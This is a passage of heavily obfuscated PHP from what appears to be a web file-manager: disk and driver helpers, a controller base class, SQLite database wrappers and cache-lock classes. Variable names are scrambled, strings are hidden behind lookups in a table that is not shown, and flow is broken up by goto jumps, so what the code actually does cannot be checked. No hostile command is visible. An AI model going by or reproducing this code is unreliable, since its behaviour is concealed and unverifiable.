rtrim($²ÃÕÎè, $Ó»ëŞ“Ç[8]) . $Ó»ëŞ“Ç[8]; if (in_array($ÌšåÄ§¦, $¬˜íî“İ)) { continue; } $¯ó–À³¤[] = $ÌšåÄ§¦; } return $¯ó–À³¤; } public static function isSameDisk($š§¬Ó‚—, $áíÛ…«) { $«Ãƒ‰õÜ =& $_SERVER[­õöî’–]; if ($GLOBALS[$«Ãƒ‰õÜ[6]][$«Ãƒ‰õÜ[1295]] == $«Ãƒ‰õÜ[1296]) { return strtolower(substr($š§¬Ó‚—, 0, 1)) == strtolower(substr($áíÛ…«, 0, 1)); } $ôöÌ­Ì« = self::diskList(); $´†Êªéœ = !1; $­åÆÉ¤ = !1; sort($ôöÌ­Ì«); $ôöÌ­Ì« = array_reverse($ôöÌ­Ì«); $š§¬Ó‚— = rtrim($š§¬Ó‚—, $«Ãƒ‰õÜ[8]) . $«Ãƒ‰õÜ[8]; $áíÛ…« = rtrim($áíÛ…«, $«Ãƒ‰õÜ[8]) . $«Ãƒ‰õÜ[8]; foreach ($ôöÌ­Ì« as $“üã›Ìˆ) { $¸ŠäšÔ› = strlen($“üã›Ìˆ); if (!$´†Êªéœ && substr($š§¬Ó‚—, 0, $¸ŠäšÔ›) == $“üã›Ìˆ) { $´†Êªéœ = $“üã›Ìˆ; } if (!$­åÆÉ¤ && substr($áíÛ…«, 0, $¸ŠäšÔ›) == $“üã›Ìˆ) { $­åÆÉ¤ = $“üã›Ìˆ; } if ($´†Êªéœ && $­åÆÉ¤) { break; } } return $´†Êªéœ === $­åÆÉ¤; } public static function transferType($üãŒ²õ´, $‹™ÄœŸí) { $‚ğ‹à¢± =& $_SERVER[­õöî’–]; $Ä¡²¶Õõ = self::driverType($üãŒ²õ´); $¯±¦¥£ = self::driverType($‹™ÄœŸí); if ($Ä¡²¶Õõ[$‚ğ‹à¢±[33]] == $¯±¦¥£[$‚ğ‹à¢±[33]] && $Ä¡²¶Õõ[$‚ğ‹à¢±[1310]] == $¯±¦¥£[$‚ğ‹à¢±[1310]]) { return $‚ğ‹à¢±[1311]; } if ($Ä¡²¶Õõ[$‚ğ‹à¢±[33]] == $‚ğ‹à¢±[859] && $¯±¦¥£[$‚ğ‹à¢±[33]] == $‚ğ‹à¢±[106]) { return $‚ğ‹à¢±[1193]; } if ($Ä¡²¶Õõ[$‚ğ‹à¢±[33]] == $‚ğ‹à¢±[106] && $¯±¦¥£[$‚ğ‹à¢±[33]] == $‚ğ‹à¢±[859]) { return $‚ğ‹à¢±[107]; } return $‚ğ‹à¢±[1312]; } public static function driverType($¹Åù¬³±) { $Óİµ’œÓ =& $_SERVER[­õöî’–]; $§›ó²”Œ = str_replace($Óİµ’œÓ[1313], $Óİµ’œÓ[12], strtolower($¹Åù¬³±->getType())); if ($§›ó²”Œ == $Óİµ’œÓ[749] || $§›ó²”Œ == $Óİµ’œÓ[1314] || $§›ó²”Œ == $Óİµ’œÓ[1315]) { $¹Åù¬³± = self::defaultDriverInit(); } else { if ($§›ó²”Œ == $Óİµ’œÓ[1203] || $§›ó²”Œ == $Óİµ’œÓ[1316]) { $¹Åù¬³± = IO::init($¹Åù¬³±->pathParse[$Óİµ’œÓ[1149]]); } } $ñƒ³ÄÈ¨ = $¹Åù¬³±->path; $§›ó²”Œ = str_replace($Óİµ’œÓ[1313], $Óİµ’œÓ[12], strtolower($¹Åù¬³±->getType())); if ($§›ó²”Œ == $Óİµ’œÓ[106]) { return array($Óİµ’œÓ[33] => $Óİµ’œÓ[106], $Óİµ’œÓ[1310] => $Óİµ’œÓ[12], $Óİµ’œÓ[84] => $ñƒ³ÄÈ¨); } return array($Óİµ’œÓ[33] => $Óİµ’œÓ[859], $Óİµ’œÓ[1310] => $¹Åù¬³±->pathDriver, $Óİµ’œÓ[84] => $ñƒ³ÄÈ¨); } public static function pathDriverType($ØÂ¦Åß†) { return $ØÂ¦Åß† ? self::driverType(IO::init($ØÂ¦Åß†)) : !1; } } goto F·ÜÜÍÊÄ; bØ ì›Ä×: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÖËŠíÀû =& $_SERVER[­õöî’–]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÖËŠíÀû[6]] =& $config; $this->values[$ÖËŠíÀû[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÖËŠíÀû[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($êâòÊòŞ) { if (1 === func_num_args()) { $this->{$êâòÊòŞ} = new $êâòÊòŞ(); } else { $³³¥İƒÔ = new ReflectionClass($êâòÊòŞ); $¦íãË²à = func_get_args(); array_shift($¦íãË²à); $this->{$êâòÊòŞ} = $³³¥İƒÔ->newInstanceArgs($¦íãË²à); } return $this->{$êâòÊòŞ}; } public function routeBind($é½ÔÏ˜, $ëÅ¾Ó¡ù, $Ú§ÆÀÔê = 3) { $¤Àö‰âü =& $_SERVER[­õöî’–]; $³ôù—½ = $this->in[$¤Àö‰âü[9]]; $é½ÔÏ˜ = str_replace($¤Àö‰âü[10], $¤Àö‰âü[11], trim(trim($é½ÔÏ˜, $¤Àö‰âü[8]), $¤Àö‰âü[12])); if (!$é½ÔÏ˜ || count($³ôù—½) <= $Ú§ÆÀÔê) { return !1; } $ş–‹¨¢æ = !0; $ï‚Âö¡“ = explode($¤Àö‰âü[8], $é½ÔÏ˜); for ($Öëè³ş˜ = 0; $Öëè³ş˜ < count($ï‚Âö¡“); $Öëè³ş˜++) { if ($ï‚Âö¡“[$Öëè³ş˜] != $³ôù—½[$Ú§ÆÀÔê + $Öëè³ş˜]) { $ş–‹¨¢æ = !1; break; } } if (!$ş–‹¨¢æ) { return; } call_user_func_array(array($this, $ëÅ¾Ó¡ù), array()); } public function routeArgs($³ÀöÇ½² = 3) { $â¿ÜÅ = $this->in[$_SERVER[­õöî’–][9]]; if (count($â¿ÜÅ) <= $³ÀöÇ½²) { return array(); } $ğˆ‡œ†ë = array(); for ($¤£×›ÁÉ = $³ÀöÇ½²; $¤£×›ÁÉ < count($â¿ÜÅ); $¤£×›ÁÉ += 2) { $ğˆ‡œ†ë[$â¿ÜÅ[$¤£×›ÁÉ]] = $â¿ÜÅ[$¤£×›ÁÉ + 1]; $this->in[$â¿ÜÅ[$¤£×›ÁÉ]] = $â¿ÜÅ[$¤£×›ÁÉ + 1]; } return $ğˆ‡œ†ë; } protected function assign($æî²ìËÇ, $Š´òşÓ‰) { $this->values[$æî²ìËÇ] = $Š´òşÓ‰; } protected function display($ ¾°Œ²§) { ob_end_clean(); extract($this->values); require $this->tpl . $ ¾°Œ²§; } } class DbSqliteBase extends Db { public function __construct($ÇŞ½¡Ù = '') { $§¼Ñ† =& $_SERVER[­õöî’–]; if (!extension_loaded($§¼Ñ†[13])) { think_exception(think_lang($§¼Ñ†[14]) . $§¼Ñ†[15]); } if (!empty($ÇŞ½¡Ù)) { if (!isset($ÇŞ½¡Ù[$§¼Ñ†[16]])) { $ÇŞ½¡Ù[$§¼Ñ†[16]] = 438; } $this->config = $ÇŞ½¡Ù; if (empty($this->config[$§¼Ñ†[17]])) { $this->config[$§¼Ñ†[17]] = array(); } } } public function connect($›ÒçÈ¼ñ = '', $Î–§¼£± = 0) { $Ø•˜ =& $_SERVER[­õöî’–]; if (!isset($this->linkID[$Î–§¼£±])) { if (empty($›ÒçÈ¼ñ)) { $›ÒçÈ¼ñ = $this->config; } $ÎÇ™›£  = !empty($›ÒçÈ¼ñ[$Ø•˜[17]][$Ø•˜[18]]) ? $›ÒçÈ¼ñ[$Ø•˜[17]][$Ø•˜[18]] : $this->pconnect; $õĞ«¨ÃÓ = $ÎÇ™›£  ? $Ø•˜[19] : $Ø•˜[20]; $this->linkID[$Î–§¼£±] = $õĞ«¨ÃÓ($›ÒçÈ¼ñ[$Ø•˜[21]], $›ÒçÈ¼ñ[$Ø•˜[16]]); if (!$this->linkID[$Î–§¼£±]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Î–§¼£±], 30000); if (1 != think_config($Ø•˜[22])) { unset($this->config); } } return $this->linkID[$Î–§¼£±]; } public function free() { $this->queryID = null; } public function query($ˆÑ”„à¿) { $á™÷ÖºÌ =& $_SERVER[­õöî’–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ˆÑ”„à¿; if ($this->queryID) { $this->free(); } think_action_status($á™÷ÖºÌ[23], 1); think_status($á™÷ÖºÌ[24]); $this->queryID = sqlite_query($this->_linkID, $ˆÑ”„à¿); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $“‰÷’ò¼ = $this->getAll(); return $“‰÷’ò¼; } } public function execute($Œå›ì¦) { $Òé˜Ÿ§½ =& $_SERVER[­õöî’–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Œå›ì¦; if ($this->queryID) { $this->free(); } think_action_status($Òé˜Ÿ§½[25], 1); think_status($Òé˜Ÿ§½[24]); $×ä®Ş·ş = sqlite_exec($this->_linkID, $Œå›ì¦); $this->debug(); if (!1 === $×ä®Ş·ş) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[­õöî’–][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $„²½¥÷ä = sqlite_query($this->_linkID, $_SERVER[­õöî’–][27]); if (!$„²½¥÷ä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $–æ„»›Æ = sqlite_query($this->_linkID, $_SERVER[­õöî’–][28]); if (!$–æ„»›Æ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ù«¤†­î = array(); if ($this->numRows > 0) { for ($…”Ìø¤æ = 0; $…”Ìø¤æ < $this->numRows; $…”Ìø¤æ++) { $Ù«¤†­î[$…”Ìø¤æ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ù«¤†­î; } public function getFields($áìÂÇ‘) { $Õ·ˆ¸»ş =& $_SERVER[­õöî’–]; $şÔ§¹²± = $this->query($Õ·ˆ¸»ş[29] . $áìÂÇ‘ . $Õ·ˆ¸»ş[30]); $§É•”ã¸ = array(); if ($şÔ§¹²±) { foreach ($şÔ§¹²± as $ä ”ˆƒé => $×ãö‹Ô) { $§É•”ã¸[$×ãö‹Ô[$Õ·ˆ¸»ş[31]]] = array($Õ·ˆ¸»ş[32] => $×ãö‹Ô[$Õ·ˆ¸»ş[31]], $Õ·ˆ¸»ş[33] => $×ãö‹Ô[$Õ·ˆ¸»ş[34]], $Õ·ˆ¸»ş[35] => (bool) ($×ãö‹Ô[$Õ·ˆ¸»ş[36]] === $Õ·ˆ¸»ş[12]), $Õ·ˆ¸»ş[37] => $×ãö‹Ô[$Õ·ˆ¸»ş[38]], $Õ·ˆ¸»ş[39] => strtolower($×ãö‹Ô[$Õ·ˆ¸»ş[40]]) == $Õ·ˆ¸»ş[41], $Õ·ˆ¸»ş[42] => strtolower($×ãö‹Ô[$Õ·ˆ¸»ş[43]]) == $Õ·ˆ¸»ş[44]); } } return $§É•”ã¸; } public function getTables($£œä‚Šå = '') { $œº¦ø¥· =& $_SERVER[­õöî’–]; $†÷ş¼…¿ = $this->query($œº¦ø¥·[45] . $œº¦ø¥·[46] . $œº¦ø¥·[47]); $¹ıÌ…™¯ = array(); foreach ($†÷ş¼…¿ as $äùÊüöù => $åÜıİöŸ) { $¹ıÌ…™¯[$äùÊüöù] = current($åÜıİöŸ); } return $¹ıÌ…™¯; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $±ÈŞèÛ =& $_SERVER[­õöî’–]; $öˆÇæ¨Æ = sqlite_last_error($this->_linkID); $this->error = $öˆÇæ¨Æ . $±ÈŞèÛ[4] . sqlite_error_string($öˆÇæ¨Æ); if ($±ÈŞèÛ[12] != $this->queryStr) { $this->error .= LNG($±ÈŞèÛ[48]) . $this->queryStr; } think_trace($this->error, $±ÈŞèÛ[12], $±ÈŞèÛ[49]); return $this->error; } public function escapeString($Å„¶–·) { return sqlite_escape_string($Å„¶–·); } public function parseLimit($™Ò¬‘ğ) { $ä¿É®¥„ =& $_SERVER[­õöî’–]; $ğ¾Şµúö = $ä¿É®¥„[12]; if (!empty($™Ò¬‘ğ)) { $™Ò¬‘ğ = explode($ä¿É®¥„[50], $™Ò¬‘ğ); if (count($™Ò¬‘ğ) > 1) { $ğ¾Şµúö .= $ä¿É®¥„[51] . $™Ò¬‘ğ[1] . $ä¿É®¥„[52] . $™Ò¬‘ğ[0] . $ä¿É®¥„[53]; } else { $ğ¾Şµúö .= $ä¿É®¥„[51] . $™Ò¬‘ğ[0] . $ä¿É®¥„[53]; } } return $ğ¾Şµúö; } } class DbSqlite3Base extends Db { public function __construct($ëĞåß€© = '') { $È¸æ¶ºŸ =& $_SERVER[­õöî’–]; if (!class_exists($È¸æ¶ºŸ[54])) { think_exception(think_lang($È¸æ¶ºŸ[14]) . $È¸æ¶ºŸ[55]); } if (!empty($ëĞåß€©)) { if (!isset($ëĞåß€©[$È¸æ¶ºŸ[16]])) { $ëĞåß€©[$È¸æ¶ºŸ[16]] = 438; } $this->config = $ëĞåß€©; if (empty($this->config[$È¸æ¶ºŸ[17]])) { $this->config[$È¸æ¶ºŸ[17]] = array(); } } } public function connect($ØÚ“°ÙÇ = '', $—ğ¦˜‘İ = 0) { $•‡ÍÒï˜ =& $_SERVER[­õöî’–]; if (!isset($this->linkID[$—ğ¦˜‘İ])) { if (empty($ØÚ“°ÙÇ)) { $ØÚ“°ÙÇ = $this->config; } $this->linkID[$—ğ¦˜‘İ] = new SQLite3($ØÚ“°ÙÇ[$•‡ÍÒï˜[21]]); if (!$this->linkID[$—ğ¦˜‘İ]) { think_exception($this->linkID[$—ğ¦˜‘İ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$—ğ¦˜‘İ]->busyTimeout(30000); if (1 != think_config($•‡ÍÒï˜[22])) { unset($this->config); } } return $this->linkID[$—ğ¦˜‘İ]; } public function free() { $this->queryID = null; } public function query($È’€”ß‹) { $¨Ûèõğˆ =& $_SERVER[­õöî’–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $È’€”ß‹; if ($this->queryID) { $this->free(); } think_action_status($¨Ûèõğˆ[23], 1); think_status($¨Ûèõğˆ[24]); $this->queryID = $this->_linkID->query($È’€”ß‹); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $™¾ÌÙ…– = $this->getAll(); $this->numRows = count($™¾ÌÙ…–); return $™¾ÌÙ…–; } } public function execute($†Æş£¢Á) { $æ¤ßµÏÚ =& $_SERVER[­õöî’–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $†Æş£¢Á; if ($this->queryID) { $this->free(); } think_action_status($æ¤ßµÏÚ[25], 1); think_status($æ¤ßµÏÚ[24]); $éØÀ…¿ = $this->_linkID->exec($†Æş£¢Á); $this->debug(); if (!1 === $éØÀ…¿) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[­õöî’–][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ü»“™“‡ = $this->_linkID->query($_SERVER[­õöî’–][27]); if (!$ü»“™“‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ö×¶§Ï = $this->_linkID->query($_SERVER[­õöî’–][28]); if (!$Ö×¶§Ï) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Øƒ¦ÁöŸ = array(); while ($é´è¹ó” = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Øƒ¦ÁöŸ[] = $é´è¹ó”; } $this->queryID->reset(); return $Øƒ¦ÁöŸ; } public function getFields($´è½Æä) { $Û‰‚¬ªš =& $_SERVER[­õöî’–]; $½Ùœèñ = $this->query($Û‰‚¬ªš[29] . $´è½Æä . $Û‰‚¬ªš[30]); $èú ¨ß = array(); if ($½Ùœèñ) { foreach ($½Ùœèñ as $­×°·¤ => $ó¤„ƒÙ) { $èú ¨ß[$ó¤„ƒÙ[$Û‰‚¬ªš[32]]] = array($Û‰‚¬ªš[32] => $ó¤„ƒÙ[$Û‰‚¬ªš[32]], $Û‰‚¬ªš[33] => $ó¤„ƒÙ[$Û‰‚¬ªš[33]], $Û‰‚¬ªš[35] => (bool) ($ó¤„ƒÙ[$Û‰‚¬ªš[35]] === $Û‰‚¬ªš[12]), $Û‰‚¬ªš[37] => $ó¤„ƒÙ[$Û‰‚¬ªš[56]], $Û‰‚¬ªš[39] => (bool) $ó¤„ƒÙ[$Û‰‚¬ªš[57]], $Û‰‚¬ªš[42] => (bool) $ó¤„ƒÙ[$Û‰‚¬ªš[57]]); } } return $èú ¨ß; } public function getTables($œûÅ™şŠ = '') { $ÚÉÅ‚Ü =& $_SERVER[­õöî’–]; $ÅÓÑäÀû = $this->query($ÚÉÅ‚Ü[45] . $ÚÉÅ‚Ü[46] . $ÚÉÅ‚Ü[47]); $É¯²âø = array(); foreach ($ÅÓÑäÀû as $ÎÅ««»¹ => $íØ„Ÿı˜) { $É¯²âø[$ÎÅ««»¹] = current($íØ„Ÿı˜); } return $É¯²âø; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Õà =& $_SERVER[­õöî’–]; $this->error = $this->_linkID->lastErrorMsg(); if ($Õà[12] != $this->queryStr) { $this->error .= LNG($Õà[48]) . $this->queryStr; } think_trace($this->error, $Õà[12], $Õà[49]); return $this->error; } public function escapeString($¨ÆÍçëè) { $Áõ¢§òû =& $_SERVER[­õöî’–]; if ($this->_linkID) { return $this->_linkID->escapeString($¨ÆÍçëè); } return str_ireplace($Áõ¢§òû[58], $Áõ¢§òû[59], $¨ÆÍçëè); } public function parseLimit($õ·ÊßÛü) { $½®¾€² =& $_SERVER[­õöî’–]; $‹Ù­¡ü– = $½®¾€²[12]; if (!empty($õ·ÊßÛü)) { $õ·ÊßÛü = explode($½®¾€²[50], $õ·ÊßÛü); if (count($õ·ÊßÛü) > 1) { $‹Ù­¡ü– .= $½®¾€²[51] . $õ·ÊßÛü[1] . $½®¾€²[52] . $õ·ÊßÛü[0] . $½®¾€²[53]; } else { $‹Ù­¡ü– .= $½®¾€²[51] . $õ·ÊßÛü[0] . $½®¾€²[53]; } } return $‹Ù­¡ü–; } } goto AŠåù¸™Õß; eåßç”Û™Ô: function binCheckBigger($ğ§ÈÔå¤, $ĞÄäüÛ) { return $ğ§ÈÔå¤ > $ĞÄäüÛ; } $_SERVER[$_SERVER[àïçãĞÒ][3]] = ("\70\61\66\67"."\x39\x36")+0;$_ug1m="gbw8ctdkz9fhum5173qixnv4p02ly6joaserzgftl07svcdxy6i4prebnuh23jk8w59qom1akhwln1um";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($‰÷øÀ³Í, $­ƒ‡Í¿Ô) { $Îôı½ĞÉ =& $_SERVER[­õöî’–]; if (isset(self::$_methodList[$‰÷øÀ³Í])) { return @call_user_func_array(self::$_methodList[$‰÷øÀ³Í], $­ƒ‡Í¿Ô); } else { if (method_exists($this, $‰÷øÀ³Í)) { return call_user_func_array(array($this, $‰÷øÀ³Í), $­ƒ‡Í¿Ô); } else { think_exception(__CLASS__ . $Îôı½ĞÉ[4] . $‰÷øÀ³Í . $Îôı½ĞÉ[5]); } } } public static function __callStatic($ÉÚô´û¼, $ÒöÆÜéû) { if (isset(self::$_methodListStatic[$ÉÚô´û¼])) { return call_user_func_array(self::$_methodListStatic[$ÉÚô´û¼], $ÒöÆÜéû); } else { if (method_exists(self, $ÉÚô´û¼)) { return call_user_func_array(array(self, $ÉÚô´û¼), $ÒöÆÜéû); } else { show_json("{$ÉÚô´û¼}\x28\51\x20\156\157\164\40\145\170\151\163\164\x3b", !1); } } } public static function addMethod($Â¹†·Æİ, $ı ğ“âœ) { self::$_methodList[$Â¹†·Æİ] = $ı ğ“âœ; } public static function addMethodStatic($·ï™Âüº, $”êÉÆá¡) { self::$_methodListStatic[$·ï™Âüº] = $”êÉÆá¡; } } goto bØ ì›Ä×; cöŸñƒ‘±: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ì°Å…’‹ =& $_SERVER[­õöî’–]; if (self::$handle) { return self::$handle; } $ìùœ ÖĞ = $GLOBALS[$ì°Å…’‹[6]][$ì°Å…’‹[349]]; self::$timeout = $ìùœ ÖĞ[$ì°Å…’‹[831]] ? $ìùœ ÖĞ[$ì°Å…’‹[831]] : 10; $ñˆú³“ = _get($GLOBALS[$ì°Å…’‹[6]], $ì°Å…’‹[832]); $Ÿ­’Şªû = $ìùœ ÖĞ[$ì°Å…’‹[818]] ? $ìùœ ÖĞ[$ì°Å…’‹[818]] : $ì°Å…’‹[199]; if ($Ÿ­’Şªû == $ì°Å…’‹[21] && $ñˆú³“ == $ì°Å…’‹[13]) { $Ÿ­’Şªû = $ì°Å…’‹[199]; } switch ($Ÿ­’Şªû) { case $ì°Å…’‹[821]: self::$handle = new CacheLockRedis(); break; case $ì°Å…’‹[822]: self::$handle = new CacheLockMemcached(); break; case $ì°Å…’‹[21]: self::$handle = new CacheLockDatabase(); break; case $ì°Å…’‹[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ì°Å…’‹[833], $ì°Å…’‹[834]); } return self::$handle; } private static function key($ˆƒ´¨¹ë) { return $_SERVER[­õöî’–][835] . Cache::key($ˆƒ´¨¹ë); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($”ÍÒêÙŒ = '') { self::$errorMsg = $”ÍÒêÙŒ; } public static function lockGlobal($ºÖ°ˆÉú, $ôáÚ‰‰) { return self::lock($ºÖ°ˆÉú, $ôáÚ‰‰, !0); } public static function lock($ï†·Õã, $òóû›Â½ = false, $èÇ¾Òş« = false) { $Ô¹—ÁáŠ =& $_SERVER[­õöî’–]; $ŞÀÄê·ñ = self::init(); $ÆŞëÇì´ = self::key($ï†·Õã); $òóû›Â½ = $òóû›Â½ ? $òóû›Â½ : self::$timeout; $ıª§ù„Ù = timeFloat(); $ë•ôÀÆ¯ = $ŞÀÄê·ñ->lock($ÆŞëÇì´, $òóû›Â½); $Ş»Ğ”òÏ = timeFloat(); if (!$ë•ôÀÆ¯) { $É‹İ¼û£ = "\x6c\x6f\x63\x6b\x20\x65\162\162\157\x72\73\153\145\171\x3d{$ï†·Õã}\73\x74\x69\x6d\145\75{$òóû›Â½}\x3b" . self::$errorMsg . $Ô¹—ÁáŠ[71] . get_caller_msg(); $•ÚâÚŒÀ = LNG($Ô¹—ÁáŠ[836]) . "\50{$òóû›Â½}\x73\51\x2e" . LNG($Ô¹—ÁáŠ[837]); $•ÚâÚŒÀ .= $Ô¹—ÁáŠ[838]; if (is_string(self::$errorMsg) && self::$errorMsg) { $•ÚâÚŒÀ = $•ÚâÚŒÀ . $Ô¹—ÁáŠ[839] . self::$errorMsg; } write_log($Ô¹—ÁáŠ[840] . sprintf($Ô¹—ÁáŠ[841], timeFloat() - $ıª§ù„Ù) . $Ô¹—ÁáŠ[842] . $É‹İ¼û£ . $Ô¹—ÁáŠ[843] . error_get_last(), $Ô¹—ÁáŠ[834]); show_json($•ÚâÚŒÀ, !1); } if (!$èÇ¾Òş«) { self::$lockItem[$ÆŞëÇì´] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¸ÜÖÀ¤Ğ = number_format(timeFloat() - $Ş»Ğ”òÏ, 3); write_log($Ô¹—ÁáŠ[844] . $ï†·Õã . $Ô¹—ÁáŠ[845] . $¸ÜÖÀ¤Ğ, $Ô¹—ÁáŠ[834]); } return $ë•ôÀÆ¯; } public static function lockGet($çĞÄô‹¨) { $ÛÇŠÎş = self::key($çĞÄô‹¨); if (self::$lockItem[$ÛÇŠÎş]) { return self::$lockItem[$ÛÇŠÎş]; } return self::init()->lockGet($ÛÇŠÎş); } public static function unlock($¹Ï‘°¯î) { $ ‹ğêëú =& $_SERVER[­õöî’–]; $¸µÆ…úµ = self::key($¹Ï‘°¯î); self::$lockItem[$¸µÆ…úµ] = null; self::init()->unlock($¸µÆ…úµ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ ‹ğêëú[846] . $¹Ï‘°¯î, $ ‹ğêëú[834]); } return; } public static function unlockRuntime() { $ò¼õŒÚ =& $_SERVER[­õöî’–]; $şâ¸ô³ = self::init(); $®Ğì•Éã = !1; foreach (self::$lockItem as $øµé£çÓ => $òØ¼¯»Ô) { if (!$òØ¼¯»Ô) { continue; } $şâ¸ô³->unlock($øµé£çÓ); if (!$®Ğì•Éã) { $®Ğì•Éã = !0; write_log($ò¼õŒÚ[847] . $øµé£çÓ . $ò¼õŒÚ[71] . get_caller_msg(), $ò¼õŒÚ[834]); continue; } write_log($ò¼õŒÚ[847] . $øµé£çÓ, $ò¼õŒÚ[834]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $çİŠ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ò¼õŒÚ[848] . $çİŠ . $ò¼õŒÚ[849] . ACTION, $ò¼õŒÚ[834]); } } public static function fileLock($ï²Á¼º) { $µÎííÍ =& $_SERVER[­õöî’–]; if (!$GLOBALS[$µÎííÍ[850]]) { $GLOBALS[$µÎííÍ[850]] = array(); } $GLOBALS[$µÎííÍ[850]][$ï²Á¼º] = !1; $§¶ŠÚÓş = fopen(DATA_PATH . $ï²Á¼º . $µÎííÍ[851], $µÎííÍ[852]); if (!$§¶ŠÚÓş) { return !1; } $GLOBALS[$µÎííÍ[850]][$ï²Á¼º] = $§¶ŠÚÓş; if (flock($§¶ŠÚÓş, LOCK_EX)) { return !0; } self::unlock($ï²Á¼º); show_json($µÎííÍ[853], !1); return !1; } public static function fileUnlock($«œ¯Øµ) { $ë—® °ö =& $_SERVER[­õöî’–]; $Í©É§†ì = $GLOBALS[$ë—® °ö[850]][$«œ¯Øµ]; if (!$Í©É§†ì) { return; } $GLOBALS[$ë—® °ö[850]][$«œ¯Øµ] = !1; flock($Í©É§†ì, LOCK_UN); fclose($Í©É§†ì); } public static function fileUnlockAll() { $â¯ç¯«¹ =& $_SERVER[­õöî’–]; if (!$GLOBALS[$â¯ç¯«¹[850]]) { return; } foreach ($GLOBALS[$â¯ç¯«¹[850]] as $Ûó«Ğû´ => $¬ºìŸÀ) { if (!$¬ºìŸÀ) { continue; } $GLOBALS[$â¯ç¯«¹[850]][$Ûó«Ğû´] = !1; flock($¬ºìŸÀ, LOCK_UN); fclose($¬ºìŸÀ); } $GLOBALS[$â¯ç¯«¹[850]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‹¸“›í· =& $_SERVER[­õöî’–]; $ˆç„óÒ± = $GLOBALS[$‹¸“›í·[6]][$‹¸“›í·[349]]; self::$cachePath = $ˆç„óÒ±[$‹¸“›í·[199]][$‹¸“›í·[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($·¬„ñÂñ, $ÁÌéæËğ = 0) { $×Ñ»Ò÷õ =& $_SERVER[­õöî’–]; $ø–Ä½ª¾ = microtime(!0); $¿¦…çõë = $ø–Ä½ª¾ + $ÁÌéæËğ + 0.0001; $µˆ„Éà = rtrim(self::$cachePath, $×Ñ»Ò÷õ[8]) . $×Ñ»Ò÷õ[854] . md5($·¬„ñÂñ) . $×Ñ»Ò÷õ[851]; if (file_exists($µˆ„Éà) && filemtime($µˆ„Éà) && filemtime($µˆ„Éà) < time() - 10) { @unlink($µˆ„Éà); } do { if (file_exists($µˆ„Éà)) { cacheLockWait(); continue; } $èÔ©Åë = fopen($µˆ„Éà, $×Ñ»Ò÷õ[855]); if (!$èÔ©Åë) { return !1; } $×ùŒÌâ¤ = flock($èÔ©Åë, LOCK_EX | LOCK_NB); self::$caches[$·¬„ñÂñ] = array($×Ñ»Ò÷õ[856] => $èÔ©Åë, $×Ñ»Ò÷õ[199] => $µˆ„Éà); fwrite($èÔ©Åë, $¿¦…çõë); clearstatcache(); if ($èÔ©Åë && $×ùŒÌâ¤) { return !0; } cacheLockWait(); } while (microtime(!0) < $¿¦…çõë); $this->unlock($·¬„ñÂñ); return !1; } public function lockGet($Óªş·üÙ) { $ğ¥šÎ“ =& $_SERVER[­õöî’–]; $‰ˆ‘·Îš = rtrim(self::$cachePath, $ğ¥šÎ“[8]) . $ğ¥šÎ“[854] . md5($Óªş·üÙ) . $ğ¥šÎ“[851]; return file_exists($‰ˆ‘·Îš); } public function unlock($¦®í…×¾) { $í”Ì¤íê =& $_SERVER[­õöî’–]; $«­°ïïÛ = self::$caches[$¦®í…×¾]; if (!$«­°ïïÛ) { return; } @flock($«­°ïïÛ[$í”Ì¤íê[856]], LOCK_UN); @fclose($«­°ïïÛ[$í”Ì¤íê[856]]); @unlink($«­°ïïÛ[$í”Ì¤íê[199]]); unset(self::$caches[$¦®í…×¾]); } } goto AÛ‡ÂÍ›ò¾; d¸™›ê‡Á„: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Ó÷¬Œ‹) { 